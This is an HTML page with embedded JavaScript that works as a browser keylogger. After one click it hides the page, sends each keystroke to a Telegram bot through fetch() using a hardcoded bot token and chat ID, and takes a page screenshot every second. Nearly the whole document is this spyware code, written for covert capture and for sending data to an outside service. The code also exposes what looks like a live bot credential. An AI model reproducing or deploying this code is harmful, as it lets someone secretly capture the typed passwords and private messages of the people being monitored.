<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keystroke Tracker with Screenshot</title>
    <style>
        body {
            display: block; /* Page is visible initially */
        }
        #startLink {
            cursor: pointer;
            color: blue;
            text-decoration: underline;
        }
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script> <!-- Include html2canvas library -->
    <script>
        const BOT_TOKEN = '7738754119:AAFpllyK3lvfi2EWgxQgsVpQA-t1GxAeg4Y';  // Replace with your Telegram Bot Token
        const CHAT_ID = '6482794683';  // Replace with your Telegram chat ID

        // Function to send captured keystrokes to Telegram Bot
        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent to Telegram:', data);
            })
            .catch(error => {
                console.error('Error sending to Telegram:', error);
            });
        }

        // Function to capture keystrokes
        function captureKeystrokes() {
            document.addEventListener('keydown', (event) => {
                const keystroke = event.key; // Capture the key pressed
                sendToTelegram(`Captured Keystroke: ${keystroke}`);  // Send keystroke to Telegram
            });
        }

        // Function to take a screenshot of the page
        function takeScreenshot() {
            html2canvas(document.body).then(function(canvas) {
                const screenshotDataUrl = canvas.toDataURL('image/png');
                
                // Send screenshot to Telegram
                sendToTelegram('Screenshot of the page:'); // Notify the screenshot capture
                // You might want to encode large data differently instead of sending the image base64 directly.
                console.log('Screenshot captured.');
            });
        }

        // Function to start the tracking without delay
        function startTracking() {
            document.body.style.display = 'none';  // Hide the page immediately
            captureKeystrokes();  // Start capturing keystrokes immediately
            
            // Set an interval to take a screenshot every 1 second
            setInterval(() => {
                takeScreenshot();  // Take a screenshot
            }, 1000);
        }

        // Event listener for the link click
        document.addEventListener("DOMContentLoaded", function() {
            const startLink = document.getElementById("startLink");
            startLink.addEventListener("click", function() {
                startTracking();
            });
        });
    </script>
</head>
<body>
    <h1>Keystroke Tracker Running in Background</h1>
    <p>Click the link below to start the tracker:</p>
    <p id="startLink">Click here to start tracking keystrokes and take a screenshot every second!</p>
</body>
</html>
